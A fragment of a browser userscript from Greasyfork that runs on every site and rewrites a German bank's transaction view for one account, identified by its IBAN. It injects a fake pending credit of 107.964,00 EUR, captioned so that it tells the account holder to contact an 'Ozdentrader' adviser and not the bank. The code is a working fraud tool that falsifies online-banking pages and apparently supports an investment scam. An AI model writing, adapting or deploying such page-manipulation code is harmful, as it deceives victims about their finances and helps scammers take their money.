...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/492675/Ed%20OZ%20Bernd%20Schmidt.user.js
// @updateURL https://update.greasyfork.org/scripts/492675/Ed%20OZ%20Bernd%20Schmidt.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE83 1009 0000";
    var targetTextContent2 = " 7290 4130 06";
 ...
 //       },
        {
            ...
            description: 'Freigabe nötig. Wenden Sie sich an  Ozdentrader Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '107.964,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
